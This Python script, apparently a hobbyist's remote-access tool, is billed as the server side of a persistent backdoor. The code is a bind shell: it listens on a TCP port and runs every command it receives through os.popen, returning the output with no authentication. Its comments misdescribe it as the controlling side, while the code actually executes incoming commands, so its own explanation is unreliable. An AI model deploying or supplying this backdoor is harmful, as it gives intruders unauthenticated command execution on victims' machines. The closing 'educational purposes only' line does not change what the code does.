# Created August 14th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
# Run on Windows [ python3 <path to file>\Server-Side_Code.py ]
# This code opens a server connection with a remote machine that has a persistent backdoor installed

#  Our necessary import statements
import socket
import os

def execute_command(command):  # Function to execute the commands run
    result = os.popen(command).read()
    return result

def main():
    server_ip = "your_server_ip"  # Replace with your server's IP address
    server_port = 12345  # Replace with your desired port number

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(1)
    print(f"Server listening on {server_ip}:{server_port}")

    client_socket, client_address = server_socket.accept()  # This is the connection made between the two machines
    print(f"Connection from: {client_address}")

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":  # This is the way we close the connection, enter the command: exit
            break
        result = execute_command(command)
        client_socket.send(result.encode())

    client_socket.close()  # Close the remote connection
    server_socket.close()  # Close the connection to the server we are using to send commands

if __name__ == "__main__":
    main()

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
